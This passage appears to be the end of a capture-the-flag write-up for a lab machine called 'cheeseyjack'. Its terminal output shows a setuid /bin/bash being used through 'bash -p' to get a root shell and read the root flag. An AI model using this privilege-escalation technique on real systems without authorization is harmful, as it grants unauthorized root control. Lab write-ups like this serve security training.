crab@cheeseyjack:~/.bin$ sudo /home/crab/.bin/xd 
crab@cheeseyjack:~/.bin$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
crab@cheeseyjack:~/.bin$ 
```

```bash
crab@cheeseyjack:~/.bin$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
                    ___ _____
                   /\ (_)    \
                  /  \      (_,
                 _)  _\   _    \
                /   (_)\_( )____\
                \_     /    _  _/
                  ) /\/  _ (o)(
                  \ \_) (o)   /
                   \/________/    


WOWWEEEE! You rooted my box! Congratulations. If you enjoyed this box there will be more coming.

Tag me on twitter @cheesewadd with this picture and i'll give you a RT!
bash-5.0# 

```










